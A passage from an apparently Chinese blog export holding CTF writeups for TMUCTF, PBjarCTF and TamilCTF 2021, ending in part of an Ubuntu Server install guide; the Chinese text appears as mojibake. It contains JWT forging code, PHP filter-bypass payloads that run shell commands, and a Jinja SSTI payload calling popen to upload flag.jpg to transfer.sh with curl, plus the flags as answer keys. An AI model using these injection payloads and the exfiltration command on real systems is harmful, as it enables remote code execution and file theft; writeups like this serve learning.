AAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA
Kn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q
AFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q
AFX/qgBV/6oAVf+qAQJMf///////////////////////////////////////////
/////////////////////////////////////////////////////////wJCAf//
////////////////////////////////////////////////////////////////
////////////////////AkxVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq
qlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqpAkIB
gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/
gIB/f4CAf3+AgH9/gIB/f38CTHve973ve973ve9773ve973ve973ve+973ve973v
e973vve973ve973ve9773ve973ve973ve+973ve973ve973vve973ve973ve970=
-----END RSA PRIVATE KEY-----
</code></pre>
<p>ä¿®æ”¹<code>payload</code>ä¸­çš„<code>sleep</code>ä¸º<code>true</code>å’Œ<code>exp</code>ä¸º<code>9999999999</code>,ç”Ÿæˆ<code>JWT Token</code>å¹¶è¯·æ±‚<code>/flag</code></p>
<p>ä»£ç :</p>
<pre><code class="Python">import jwt

with open(&#39;private.pem&#39;,&#39;r&#39;) as f:
    secret = f.read()
print(secret)

dic = &#123;
    &quot;fresh&quot;: False,
    &quot;iat&quot;: 1631241476,
    &quot;jti&quot;: &quot;4b30d7a8-256f-405e-9640-4278728a8602&quot;,
    &quot;type&quot;: &quot;access&quot;,
    &quot;sub&quot;: &quot;devil&quot;,
    &quot;nbf&quot;: 1631241476,
    &quot;exp&quot;: 9999999999,
    &quot;sleep&quot;: &quot;true&quot;,
    &quot;danger&quot;: &quot;true&quot;
&#125;
headers = &#123;
    &quot;typ&quot;: &quot;JWT&quot;,
    &quot;alg&quot;: &quot;RS256&quot;
&#125;
token = jwt.encode(dic, secret, headers=headers, algorithm=&#39;RS256&#39;)
print(token)
</code></pre>
<p><strong>flag:</strong><code>TMUCTF&#123;0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?&#125;</code></p>
<h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><p><em>A fun visual cryptogr aphy tool will amaze your kids!</em></p>
<hr>
<p>é¢˜ç›®ä¸­ç»™å‡ºäº†ä¸¤å¼ ç°åº¦å›¾<code>ciphered_message.png</code>å’Œ<code>secret.png</code>,å…ˆç”¨<code>PIL</code>çœ‹ä¸€ä¸‹å›¾ç‰‡ä¸­æ¯ä¸ªåƒç´ ç‚¹çš„å€¼,å‘ç°å‡ä¸º0æˆ–255.</p>
<pre><code class="python">from PIL import Image
im = Image.open(&#39;ciphered_message.png&#39;)
print(list(im.getdata()))
</code></pre>
<p>ä½¿ç”¨<code>PIL</code>åˆå¹¶ä¸¤å¼ å›¾ç‰‡å³å¯.</p>
<pre><code class="Python">from PIL import Image

im = Image.open(&#39;ciphered_message.png&#39;)
im2 = Image.open(&#39;secret.png&#39;)
assert im.size == im2.size
size = im2.size
print(size)
print(im.mode)
data = [x for x in im.getdata()]
for index,x in enumerate(im2.getdata()):
    if x and data[index]:
        data[index] = 255
    else:
        data[index] = 0

im = Image.new(&#39;1&#39;,size)
im.putdata(data)
im.save(&#39;ans.png&#39;)
</code></pre>
<p><img data-src="/../../CTF/TMUCTF2021/Welcome/assets/ans.png" alt="TMUCTF"></p>
<p><strong>flag:</strong><code>TMUCTF&#123;W3_h0p3_y0u_3nj0y_7h15_c0mp371710n_4nd_7h4nk_y0u!&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TMUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PBjarCTF2021 Writeup</title>
    <url>/posts/2720124286/</url>
    <content><![CDATA[<h1 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h1><p><em>So this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don&#39;t know how to do this, Google is your best friend!!!</em></p>
<hr>
<p>ç»™äº†ä¸€ä¸ªæ–‡ä»¶<code>file.txt</code>,é‡Œé¢æ˜¯ä¸€ä¸ª16è¿›åˆ¶çš„æ•°:</p>
<pre><code class="python">n = &#39;666c61677b6469735f69735f615f666c346767675f68317d&#39;
for i in range(0,len(n),2):
    print(chr(int(n[i:i+2],16)),end=&#39;&#39;)
</code></pre>
<p><strong>flag:</strong><code>flag&#123;dis_is_a_fl4ggg_h1&#125;</code></p>
<h1 id="Not-Baby"><a href="#Not-Baby" class="headerlink" title="Not_Baby"></a>Not_Baby</h1><p><em>Hmm.... What is this?</em></p>
<hr>
<pre><code class="python">from Crypto.Util.number import *
with open(&#39;flag.txt&#39;, &#39;rb&#39;) as g:
    flag = g.read().strip()

with open(&#39;nums.txt&#39;, &#39;r&#39;) as f:
    s = f.read().strip().split()
    a = int(s[0])
    b = int(s[1])
    c = int(s[2])

e = 65537
n = a**3+b**3-34*c**3
m = bytes_to_long(flag)
ct = pow(m, e, n)

print(&quot;n: &quot;, n)
print(&quot;e: &quot;, e)
print(&quot;ct: &quot;, ct)
</code></pre>
<p>åœ¨<a href="http://factordb.com/">factordb.com</a>ä¸Šåˆ†è§£n,å¾—åˆ°</p>
<pre><code class="python">n = 2^2 Â· 73 Â· 181 Â· 11411 Â· 235111 Â· 6546828737292350227122068012441477&lt;34&gt; Â· 61872434969046837223597248696590986360784288448775988338706090668799371&lt;71&gt;
</code></pre>
<p>ç»§ç»­å°è¯•åœ¨<a href="http://factordb.com/">factordb.com</a>ä¸Šåˆ†è§£åä¸¤ä¸ªæ•°,å‘ç°äºŒè€…å‡ä¸ºç´ æ•°</p>
<p>é€‰æ‹©ä¸¤ä¸ªä»¥ä¸Šçš„ç´ æ•°ç›¸ä¹˜å¾—åˆ°næ—¶,å…¬é’¥ã€ç§é’¥ã€åŠ è§£å¯†ä¸ä¸€èˆ¬ RSA ç›¸åŒã€‚</p>
<p><code>Ï†(n)=(p1âˆ’1)(p2âˆ’1)(p3âˆ’1)...</code></p>
<p><strong>exp</strong></p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long2str
n = 57436275279999211772332390260389123467061581271245121044959385707165571981686310741298519009630482399016808156120999964
e = 65537
ct = 25287942932936198887822866306739577372124406139134641253461396979278534624726135258660588590323101498005293149770225633

ls = [2, 2, 73, 181, 11411, 235111, 6546828737292350227122068012441477, 61872434969046837223597248696590986360784288448775988338706090668799371]

phi = 1
for x in ls:
    phi *= (x-1)

d = gmpy2.invert(e, phi)
x = pow(ct, d, n)
print(long2str(x))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;f4ct0ring_s0000oo00000o00_h4rd&#125;</code></p>
<h1 id="ReallynotSecureAlgorithm"><a href="#ReallynotSecureAlgorithm" class="headerlink" title="ReallynotSecureAlgorithm"></a>ReallynotSecureAlgorithm</h1><p><em>Here&#39;s the obligatory problem!!!</em></p>
<hr>
<p>é¢˜ç›®ç»™äº†p,q,e,cçš„å€¼,ç›´æ¥æ±‚dè§£å¯†å³å¯</p>
<pre><code class="python">from Crypto.Util.number import *
with open(&#39;flag.txt&#39;,&#39;rb&#39;) as f:
    flag = f.read().strip()
e=65537
p=getPrime(128)
q=getPrime(128)
n=p*q
m=bytes_to_long(flag)
ct=pow(m,e,n)

print (p)
print (q)
print (e)
print (ct)
</code></pre>
<p>ä»£ç :</p>
<pre><code class="python">from Crypto.Util.number import long2str
import gmpy2

p = 194522226411154500868209046072773892801
q = 288543888189520095825105581859098503663
e = 65537
c = 2680665419605434578386620658057993903866911471752759293737529277281335077856

n = p*q
phi = (p-1) * (q-1)
d = gmpy2.invert(e,phi)
x = pow(c,d,n)
print(long2str(x))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;n0t_to0_h4rd_rIt3_19290453&#125;</code></p>
<h1 id="TechLead"><a href="#TechLead" class="headerlink" title="TechLead"></a><strong>TechLead</strong></h1><p><em>Infamous YouTuber, and ex-Google &#x2F; ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address? Million Token: <a href="https://coinmarketcap.com/currencies/million/">https://coinmarketcap.com/currencies/million/</a> Flag format: flag{0.006942069420}</em></p>
<hr>
<p>è®¿é—®é¢˜ç›®ä¸­ç»™å‡ºçš„é“¾æ¥ï¼Œç‚¹å‡»<code>Explores</code>-&gt;<code>Etherscan.io</code>,<a href="https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611#balances">https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-0.png" alt="TechLead"></p>
<p>ç‚¹å‡»<code>Holders</code>,æ‰¾åˆ°<code>TechLead </code>çš„<code>address</code>,0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-1.png" alt="TechLead"></p>
<p>è®¿é—®<a href="https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4#analytics">https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</a>,ç‚¹å‡»<code>analytics</code></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-2.png" alt="TechLead-2"></p>
<p><strong>flag:</strong><code>flag&#123;1.4625790953780384&#125;</code></p>
<h1 id="miner"><a href="#miner" class="headerlink" title="miner"></a><strong>miner</strong></h1><p><em>Block #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block?</em></p>
<hr>
<p><a href="https://etherscan.io/block/11834380">https://etherscan.io/block/11834380</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/miner.png" alt="miner"></p>
<p><strong>flag:</strong><code>flag&#123;0xd224ca0c819e8e97ba0136b3b95ceff503b79f53&#125;</code></p>
<h1 id="readFlag1"><a href="#readFlag1" class="headerlink" title="readFlag1"></a>readFlag1</h1><p><em>The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD#code">https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag1.png" alt="readFlag1"></p>
<p><strong>flag:</strong><code>flag&#123;etherscan_S0urc3_c0de&#125;</code></p>
<h1 id="readFlag2"><a href="#readFlag2" class="headerlink" title="readFlag2"></a>readFlag2</h1><p><em>I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to &quot;get()&quot; the flag. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866#internaltx">https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag2-0.png" alt="assets/readFlag2-0.png"></p>
<p>ç‚¹å‡»Internal Texs,è®¿é—®ç¬¬ä¸€ä¸ª<code>Contract</code></p>
<p><a href="https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151#code">https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151</a></p>
<p>ç‚¹å‡»<code>Read Contract</code></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag2.png" alt="readFlag2"></p>
<p><strong>flag:</strong><code>flag&#123;web3js_plus_ABI_equalls_flag&#125; </code></p>
<h1 id="readFlag3"><a href="#readFlag3" class="headerlink" title="readFlag3"></a>readFlag3</h1><p><em>0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code">https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag3.png" alt="image-20210923154202557"></p>
<p><strong>flag:</strong><code>flag&#123;s3t_by_c0nstructor&#125;</code></p>
<h1 id="ProgrammersHateProgramming"><a href="#ProgrammersHateProgramming" class="headerlink" title="ProgrammersHateProgramming"></a>ProgrammersHateProgramming</h1><p><em>just a little different than normally. Link: <a href="http://147.182.172.217:42002/index.php">http://147.182.172.217:42002/index.php</a></em></p>
<hr>
<pre><code class="php">&lt;?php
if(isset($_POST[&quot;notewrite&quot;]))
&#123;
    $newnote = $_POST[&quot;notewrite&quot;];
    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);
    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;script&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $filename = generateRandomString();
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
</code></pre>
<p><strong>payload</strong></p>
<pre><code class="php">&lt;?php&lt;?php
 echo `cat /flagflag.php`;
?&gt;?&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we&#39;re_developing_a_really_meaningful_connection&#125;</code></p>
<h1 id="ProgrammersHateProgramming-2"><a href="#ProgrammersHateProgramming-2" class="headerlink" title="ProgrammersHateProgramming 2"></a>ProgrammersHateProgramming 2</h1><p><em>oh noes now there are more filters :(( Link: <a href="http://147.182.172.217:42007/">http://147.182.172.217:42007/</a></em></p>
<hr>
<pre><code class="php">&lt;?php
if(isset($_POST[&quot;notewrite&quot;]))
&#123;
    $newnote = $_POST[&quot;notewrite&quot;];
    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);
    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;ls&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;ZeroDayTea is not hot&quot;, &quot;&quot;, $notetoadd);

    $filename = generateRandomString();
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
?&gt;
</code></pre>
<p><strong>payload</strong></p>
<pre><code class="php">&lt;?php&lt;?&lt;?php
 echo `sort /flagflag.php`;
?&gt;?&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)&#125;</code></p>
<h1 id="cOrL"><a href="#cOrL" class="headerlink" title="cOrL"></a>cOrL</h1><p><em>Descriptions are hard give me a break. (Think of common usernames and passwords for admin) Link: <a href="http://147.182.172.217:42003/">http://147.182.172.217:42003/</a></em></p>
<hr>
<p>è®¿é—®é¢˜ç›®ç»™å‡ºçš„é“¾æ¥ï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„ç™»å½•è¡¨å•ã€‚ç”¨<code>admin:admin</code>ç™»å½•</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Web/assets/corl2.png" alt="cOrL"></p>
<p>ä½¿ç”¨Burp Suitelæ‹¦æˆªè¯·æ±‚ï¼Œå°†HTTPè¯·æ±‚æ–¹å¼ä¿®æ”¹ä¸º<code>Put</code>å³å¯:</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Web/assets/corl20-flag.png" alt="image-20210923170425418"></p>
<p><strong>flag:</strong><code>flag&#123;HTTP_r3qu35t_m3th0d5_ftw&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PBjarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TamilCTF2021 Writeup</title>
    <url>/posts/2827311957/</url>
    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
<p>è®¿é—®é¢˜ç›®ä¸­ç»™å‡ºçš„é“¾æ¥,å‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>éšä¾¿è¾“å…¥ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ç›´æ¥å¯ä»¥ç™»å½•,æç¤ºæˆ‘ä»¬flagæ–‡ä»¶çš„è·¯å¾„æ˜¯<code>./flag.jpg</code>.<br>F12çœ‹æºç å‘ç°æ³¨é‡Šä¸­ä¼šæ˜¾ç¤ºåˆšæ‰ç™»å½•æ‰€ç”¨çš„ç”¨æˆ·å,çŒœæµ‹å­˜åœ¨SSTIæ¼æ´,ç›´æ¥ç”¨æ³¨å…¥ä»£ç ä½œä¸ºç”¨æˆ·åç™»å½•å³å¯<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
<p>ä½¿ç”¨ä¸‹åˆ—ä»£ç ä½œä¸ºç”¨æˆ·åç™»å½•,æŸ¥çœ‹å½“å‰å·²åŠ è½½çš„æ¨¡å—;åˆ æ‰HTMLçš„æ³¨é‡Šæ ‡è®°<code>&lt;!--</code>,æ‰¾åˆ°<code>os._wrap_close</code>æ¨¡å—æ‰€åœ¨çš„ç´¢å¼•ä¸º132,å€ŸåŠ©äº<code>popen</code>å‡½æ•°å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
<p>ä½¿ç”¨<code>curl</code>å‘½ä»¤å°†<code>flag.jpg</code>æ–‡ä»¶ä¸Šä¼ è‡³<a href="http://transfer.sh/">transfer.sh</a></p>
<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
</code></pre>
<p>åœ¨HTMLæ³¨é‡Šä¸­æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ åçš„URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />

<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TamilCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkServer RD650å®‰è£…Ubuntu Server 16.04</title>
    <url>/posts/560540611/</url>
    <content><![CDATA[<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ol>
<li>åœ¨Ubuntuå®˜ç½‘ä¸Šä¸‹è½½Ubuntu Server 16.04çš„ISOé•œåƒ(<a href="http://releases.ubuntu.com/16.04/">ä¸‹è½½é“¾æ¥</a>)ï¼›</li>
<li>ä½¿ç”¨åˆ»å½•è½¯ä»¶(å¦‚:è½¯ç¢Ÿé€š)å°†isoé•œåƒæ–‡ä»¶å†™å…¥Uç›˜ä¸­ï¼Œåˆ¶æˆå¯åŠ¨ç›˜ï¼›</li>
<li>å°†ISOé•œåƒæ–‡ä»¶æ‹·è´è‡³Uç›˜çš„æ ¹ç›®å½•ï¼Œä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œï¼Œè¿™é‡Œå¯å°†é•œåƒæ–‡ä»¶é‡å‘½åä¸º<code>Ubuntu.iso</code>ï¼›<span id="more"></span></li>
</ol>
<h2 id="è®¾ç½®å¼•å¯¼"><a href="#è®¾ç½®å¼•å¯¼" class="headerlink" title="è®¾ç½®å¼•å¯¼"></a>è®¾ç½®å¼•å¯¼</h2><ol>
<li>æŒ‰ç”µæºé”®å¼€æœºï¼Œå¯åŠ¨æœåŠ¡å™¨(æœåŠ¡å™¨å¯åŠ¨å¯èƒ½ä¼šæ¯”è¾ƒç¼“æ…¢)ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg)</li>
<li>å‡ºç°æ­¤ç•Œé¢æ—¶ï¼ŒæŒ‰&quot;F10&quot;è¿›å…¥TDM(ThinkServerâ€‚Deploymentâ€‚Manager)ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg)</li>
<li>è¿›å…¥TDMåï¼Œé€‰æ‹©&quot;BIOS Setup(BIOS è®¾ç½®)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg)</li>
<li>é€‰æ‹©&quot;Boot Manager(å¼•å¯¼ç®¡ç†)&quot;,å°†&quot;Boot Mode(å¼•å¯¼æ¨¡å¼)&quot;æ”¹ä¸º&quot;UEFI Only(ä»…UEFIæ¨¡å¼)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg)</li>
<li>ç‚¹å‡»&quot;Save &amp; Reset(ä¿å­˜ &amp; é‡å¯)&quot;,åœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é€‰æ‹©&quot;Yes(æ˜¯)&quot;é‡å¯ç”µè„‘ã€‚å¦‚æœå‡ºç°å¦‚ä¸‹å¯¹è¯æ¡†ï¼Œé€‰æ‹©&quot;No(å¦)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg)</li>
</ol>
<h2 id="å¼€å§‹å®‰è£…"><a href="#å¼€å§‹å®‰è£…" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h2><ol>
<li>å°†Uç›˜æ’å…¥æœåŠ¡å™¨åçš„USBæ’æ§½ä¸­ï¼Œé‡å¯æœåŠ¡å™¨ï¼Œè¿›å…¥ä¸‹å›¾æ‰€ç¤ºç•Œé¢ã€‚é€‰æ‹©&quot;Install Ubuntu Server(å®‰è£…UbuntuæœåŠ¡å™¨ç‰ˆ)&quot;ï¼›<br>æ³¨:è‹¥æ— æ³•è¿›å…¥ä¸‹å›¾æ‰€ç¤ºç•Œé¢ï¼Œè¯·è¿›å…¥BIOSä¿®æ”¹Uç›˜ä¸ºç¬¬ä¸€å¯åŠ¨é¡¹ã€‚<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg)</li>
<li>é€‰æ‹©å®‰è£…è¿‡ç¨‹å’Œç³»ç»Ÿçš„é»˜è®¤è¯­è¨€ä¸º&quot;English(è‹±è¯­)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg)</li>
<li>&quot;Select your location(é€‰æ‹©ä½ çš„åŒºåŸŸ)&quot;ï¼Œè¿™é‡Œé€‰æ‹©&quot;Other(å…¶ä»–)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg)</li>
<li>&quot;Continent or region(å¤§é™†æˆ–åœ°åŒº)&quot;é€‰æ‹©&quot;Asia(äºšæ´²)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg)</li>
<li>&quot;Country(å›½å®¶)&quot;é€‰æ‹©&quot;China(ä¸­å›½)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg)</li>
<li>æ˜¯å¦é€šè¿‡ä¸€ç³»åˆ—çš„æŒ‰é”®æ£€æµ‹é”®ç›˜å¸ƒå±€ï¼Œé€‰æ‹©&quot;NO(å¦)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg)</li>
<li>å­—ç¬¦é›†ç¼–ç é€‰æ‹©&quot;United States -en_US.UTF-8&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg)</li>
<li>&quot;Country or Region for the keyboard(é”®ç›˜å¸ƒå±€æ‰€å±å›½å®¶æˆ–åœ°åŒº)&quot;,é€‰æ‹©&quot;English(US)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg)</li>
<li>&quot;Keyboard layout(é”®ç›˜å¸ƒå±€)&quot;ï¼Œé€‰æ‹©&quot;English(US)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg)</li>
<li>ç¨ç­‰ç‰‡åˆ»ï¼Œå°†ä¼šæ˜¾ç¤ºå‡ºç°é”™è¯¯,åŸå› ä¸º:å®‰è£…ç¨‹åºæœªæ£€æµ‹åˆ°CD-ROMã€‚æ˜¯å¦é‡è¯•ï¼Œé€‰æ‹©&quot;No(å¦)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg)</li>
<li>è¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œé€‰æ‹©&quot;Execute a shell(è¿è¡Œshell)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg)</li>
<li>åœ¨shellä¸­ä¾æ¬¡è¾“å…¥å¦‚ä¸‹å‘½ä»¤:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /dev/sd*</span><br><span class="line">umount /dev/sdb4/</span><br><span class="line">mkdir udev</span><br><span class="line">mount /dev/sdb4 /udev</span><br><span class="line">mount /udev/ubuntu.iso /cdrom</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
ä¸€èˆ¬ä¼šå‡ºç°ä¸¤ä¸ª<code>/dev/sdb*</code>é¡¹ï¼Œæˆ‘ä»¬é€‰æ‹©å¸¦æ•°å­—çš„é‚£ä¸€é¡¹å»æ›¿æ¢ä¸Šé¢ä»£ç ä¸­çš„<code>/dev/sdb4</code>;<br><code>ubuntu.iso</code>ä¸ºUç›˜ä¸­Ubuntu Serverçš„ISOé•œåƒçš„æ–‡ä»¶å&quot;ã€‚<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg)</li>
